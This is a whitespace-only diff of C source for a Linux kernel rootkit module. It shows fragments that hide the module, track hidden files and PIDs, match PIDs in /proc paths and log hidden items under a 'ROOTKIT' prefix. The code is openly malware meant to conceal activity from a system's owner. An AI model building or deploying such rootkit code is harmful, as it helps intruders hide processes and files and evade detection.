@@ -1,5 +1,5 @@
 #include <linux/module.h>   // THIS_MODULE, also includes list.h
-#include <linux/slab.h>		// kmalloc()
+#include <linux/slab.h>	    // kmalloc()
 #include <linux/uaccess.h>  // copy from user
 #include <linux/limits.h>   // PATH_MAX
 
@@ -25,7 +25,7 @@ static struct list_head* prev_module;
 static unsigned int num_symtab_old;
 
 bool is_module_hidden(void){
-    return module_hidden;
+	return module_hidden;
 }
 
 int hide_module(void){
@@ -63,23 +63,23 @@ int unhide_module(void){
 
 // Delete lists
 static void delete_pids_node(struct list_pids_node* node){
-    list_del(&node->list);
-    kfree(node);
+	list_del(&node->list);
+	kfree(node);
 }
 
 static void delete_files_node(struct list_files_node* node){
-    list_del(&node->list);
-    kfree(node->name);
-    kfree(node);
+	list_del(&node->list);
+	kfree(node->name);
+	kfree(node);
 }
 
 void delete_lists(void){
 	struct list_pids_node *node_pid, *tmp_pid;
-    struct list_files_node *node_file, *tmp_file;
-    list_for_each_entry_safe(node_pid, tmp_pid, &list_pids, list)
-        delete_pids_node(node_pid);
-    list_for_each_entry_safe(node_file, tmp_file, &list_files, list)
-        delete_files_node(node_file);
+	struct list_files_node *node_file, *tmp_file;
+	list_for_each_entry_safe(node_pid, tmp_pid, &list_pids, list)
+		delete_pids_node(node_pid);
+	list_for_each_entry_safe(node_file, tmp_file, &list_files, list)
+		delete_files_node(node_file);
 }
 
 // Hide those files
@@ -145,7 +145,7 @@ bool is_pid_hidden(int pid){
 	return false;
 }
 
-static 	char* my_basename(const char* pathname){
+static char* my_basename(const char* pathname){
 	// Gets the basename keeping the trailing '/' if present
 	// Examples: 1234/ /1234 1234 proc/1234 /1234/
 	int len = strlen(pathname);
@@ -163,7 +163,7 @@ int pid_in_pathname(const char __user* pathname){
 	 *   cd /proc; ls $PID; cat $PID/cmdline
 	 * Also same but using cd instead of ls and adding '/' at the end.
 	*/
-    struct list_pids_node* node;
+	struct list_pids_node* node;
 	char pid_str[8], pid_str2[9];
 	char* filename;
 	int ret = -1;
@@ -232,16 +232,16 @@ int unhide_pid(int pid){
 }
 
 void print_hidden(void){
-    log(KERN_INFO "ROOTKIT: Hidden files: ");
-    struct list_files_node* node_file;
-    struct list_pids_node* node_pid;
-    list_for_each_entry(node_file, &list_files, list){
-        log(KERN_CONT "%s, ", node_file->name);
-    }
-    log(KERN_CONT "\n");
-    log(KERN_INFO "ROOTKIT: Hidden pids: ");
-    list_for_each_entry(node_pid, &list_pids, list){
-        log(KERN_CONT "%d, ", node_pid->pid);
-    }
-    log(KERN_CONT "\n");
+	log(KERN_INFO "ROOTKIT: Hidden files: ");
+	struct list_files_node* node_file;
+	struct list_pids_node* node_pid;
+	list_for_each_entry(node_file, &list_files, list){
+		log(KERN_CONT "%s, ", node_file->name);
+	}
+	log(KERN_CONT "\n");
+	log(KERN_INFO "ROOTKIT: Hidden pids: ");
+	list_for_each_entry(node_pid, &list_pids, list){
+		log(KERN_CONT "%d, ", node_pid->pid);
+	}
+	log(KERN_CONT "\n");
 }
